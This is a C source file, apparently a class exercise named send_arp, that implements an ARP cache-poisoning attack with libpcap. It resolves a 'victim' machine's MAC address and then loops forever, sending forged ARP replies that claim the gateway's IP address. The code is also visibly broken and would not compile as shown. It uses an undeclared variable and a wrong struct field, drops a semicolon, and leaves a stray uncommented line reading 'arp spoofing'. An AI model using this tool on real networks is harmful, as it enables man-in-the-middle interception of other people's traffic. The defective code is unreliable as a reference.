
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>
#include <netinet/if_ether.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <ifaddrs.h>
///////////////////////////////////////////////////////
#define MAC_ADDR_LEN 6
#define IP_ADDR_LEN 4

#define BROADCAST 1
#define UNKOWN_TARGET 2
////////////////////STRUCT DEF//////////////////////////
typedef struct _ether_hdr
{
	uint8_t dmac[MAC_ADDR_LEN];
	uint8_t smac[MAC_ADDR_LEN];
	uint16_t type;
} ether_hdr;

typedef struct _arp_hdr{

    uint16_t HW_type;
    uint16_t Proto_type;
    uint8_t HW_addr_len;
    uint8_t Proto_addr_len;
    uint16_t opcode;
    uint8_t Sender_HW_addr[MAC_ADDR_LEN];    // 6 bytes
    uint8_t Sender_Proto_addr[IP_ADDR_LEN];
    uint8_t Target_HW_addr[MAC_ADDR_LEN];    // 6 bytes
    uint8_t Target_Proto_addr[IP_ADDR_LEN];

} arp_hdr;
////////////////////////////////////////////////////////
//IP string includes dot(".") so, remove dot and convert to 1byte array
void convert_str_to_ipaddr(char *ip_str, uint8_t *ip)
{
    for(int i=0; i<4;i++)
    {
        ip[i] = atoi(ip_str);
        do{
            if((*ip_str)=='.'||(*ip_str)=='\0')
            {
                ip_str++;
                break;
            }
        } while(ip_str++);
    }
}
/////////////////////////////////////////////////////////
//get my MAC address from network interface device name
//using IFREQ
void get_my_mac_addr(char *dev_name, uint8_t *mac)
{
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev_name);
    if(0 == ioctl(fd, SIOCGIFHWADDR, &s))
    {
        for(int i = 0;i<MAC_ADDR_LEN; i++)
            mac[i] = s.ifr_addr.sa_data[i];
        memcpy(des, s.ifr_name.sa_data, MAC_ADDR_LEN);
    }
}
///////////////////////////////////////////////////////////
//get my IP address from network interface device name
//using IFREQ
void get_my_ip_addr(char *dev_name, uint8_t *ip)
{
    struct ifreq s;
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    s.ifr_addr.sa_family = AF_INET;

    strncpy(s.ifr_name, dev_name, IFNAMSIZ -1);
    ioctl(fd, SIOCGIFADDR, &s);
    close(fd);
    
    char *ipaddr = inet_ntoa(((struct sockaddr_in *)&s.ifr_addr)->sin_addr);
    convert_str_to_ipaddr(ipaddr, ip);
}

//////////////////////////////////////////////////////////
//set pointer of MAC address => ff:ff:ff:ff:ff:ff (type = BROADCAST)
//set pointer of MAC address => 00:00:00:00:00:00 (type = UNKOWN_TARGET)
void set_cast(uint8_t *mac,int type)
{
    if (type == BROADCAST)
        for(int i=0; i<MAC_ADDR_LEN; i++) 
            mac[i] = 0xff;
    if (type == UNKOWN_TARGET)
        for(int i=0; i<MAC_ADDR_LEN; i++)
            mac[i] = 0x00;
}
//////////////////////////////////////////////////////////
//print mac address by pointer of MAC address
void print_mac(uint8_t *mac_addr)
{
			printf("%.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",
			 mac_addr[0], mac_addr[1], mac_addr[2], mac_addr[3], mac_addr[4], mac_addr[5]);
}
///////////////////////////////////////////////////////////
//get two pointers of ip address
//return 0 : if two ip addresses are different
//return 1 : if two ip addresses are same
int ip_check(uint8_t *des, uint8_t *src)
{
    for(int i=0; i<IP_ADDR_LEN; i++)
        if(des[i]!=src[i])
            return 0;
    
    return 1;
}
////////////////////////////////////////////////////////////
//If you want to assign MAC address same as given MAC
void mac_assign(uint8_t *des, uint8_t *src)
{
    for(int i=0; i<MAC_ADDR_LEN; i++)
        des[i] = src[i];
}
/////////////////////////MAIN///////////////////////////////
int main(int argc, char *argv[])
{
    if(argc != 4)
    {
        printf("USAGE: send_arp <interface> <sender_ip> <target_ip>\n");
        return -1;
    }

    char *dev = argv[1];
    char *sender_ip = argv[2];
    char *receiver_ip = argv[3];
	char errbuf[PCAP_ERRBUF_SIZE];

//network interface handle open
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

    //send spoofed arp packet to sender ip
    //I need to know about sender's mac addr
    //I must edit sender ip's 
    const u_char packet[60] = {0,}; 

//to get victim's MAC addr, send to ARP request

/////////////////////SET ETHERNET HEADER////////////////////////
    ether_hdr *eth_h = (ether_hdr *)packet;

    get_my_mac_addr(dev, eth_h->smac);
    set_cast(eth_h->dmac,BROADCAST);
    eth_h->type = htons(ETHERTYPE_ARP);        //network layer protocol set ARP
    
//////////////////////SET ARP HEADER//////////////////////////
    arp_hdr *arp_h = (arp_hdr *)(packet + sizeof(ether_hdr));
    
    arp_h->HW_type = htons(ARPHRD_ETHER);            //ethernet(MAC) = network link protocol type
    arp_h->Proto_type = htons(ETHERTYPE_IP);         //ipv4(It means.. network protocol for ARP media is ipv4)
    arp_h->HW_addr_len = MAC_ADDR_LEN;               //I set HW Type = MAC so, set HW_addr_len = 6
    arp_h->Proto_addr_len = IP_ADDR_LEN;             //I set NETWORK Type = IPV4 so, set Proto_addr_len = 4
    arp_h->opcode = htons(ARPOP_REQUEST);            //ARP Request
    get_my_mac_addr(dev, arp_h->Sender_HW_addr);     //assign my mac addr
    get_my_ip_addr(dev, arp_h->Sender_Proto_addr);   //assign my ip addr
    set_cast(arp_h->Target_HW_addr, UNKOWN_TARGET);  //I don't know about the victim's MAC addr, so set 00:00:00:00:00:00
    convert_str_to_ipaddr(argv[2], arp_h->Target_Proto_addr);
    
    while(1)
    {
        if(pcap_sendpacket(handle, packet, 60) == PCAP_ERROR)
        {
            fprintf(stderr,"[ERROR]pcap_sendpacket() error\n");
            return -1;
        }
        printf(">>Send to ARP REQUEST packet to the victim SUCCESSLY.");

        const u_char arp_reply_packet[60] = {0,};
        ether_hdr *arp_reply_eth_h = (ether_hdr *)arp_reply_packet;
        arp_hdr *arp_reply_arp_h = (arp_hdr *)(arp_reply_packet + sizeof(ether_hdr)); 

        struct pcap_pkthdr* header;
        const u_char* receive_packet;

        int res = pcap_next_ex(handle, &header, &receive_packet);
        if (res == 0) 					//none be captured ( timeout )
            continue;
        if (res == -1 || res == -2)		//pcap_next_ex error
            break;

		ether_hdr *receive_eth_h = (ether_hdr *)receive_packet;
        if(ntohs(receive_eth_h->type) == ETHERTYPE_ARP)
        {
            arp_hdr *receive_arp_h = (arp_hdr *)(receive_packet + sizeof(ether_hdr));

            if(ntohs(receive_arp_h->opcode) == ARPOP_REPLY) //ARP Reply
            {
                if(ip_check(receive_arp_h->Sender_Proto_addr, arp_h->Target_Proto_addr))
                {   
                    printf("<<I got ARP REPLY packet from the victim. He's mac address is")
                    print_mac(receive_arp_h->Sender_HW_addr);
                    
                    mac_assign(arp_h->Target_HW_addr,receive_arp_h->Sender_HW_addr);
                    mac_assign(eth_h->dmac, receive_arp_h->Sender_HW_addr);
                    break;
                }
                else
                    continue;
            }
            else
                continue;
        }
        sleep(10);  //if arp reply is not captured, sleep 10 sec and re-send packet
    }

    arp spoofing
    while(1)
    {
        convert_str_to_ipaddr(receiver_ip, arp_h->Sender_Proto_addr);  //arp sender protocol address=>gateway ip addr
        arp_h->opcode = htons(ARPOP_REPLY);                            //ARP REPLY

        if(pcap_sendpacket(handle, packet, 60) == PCAP_ERROR)
        {
            fprintf(stderr,"[ERROR]pcap_sendpacket() error\n");
            return -1;
        }

        printf(">>Send to poisoned arp packet to victim ");
        printf("%s/", sender_ip);
        print_mac(arp_h->Target_HW_addr);
        sleep(1);                                                  //RE-send poisoning packet every 1 sec
    }
    
    return 0;
}

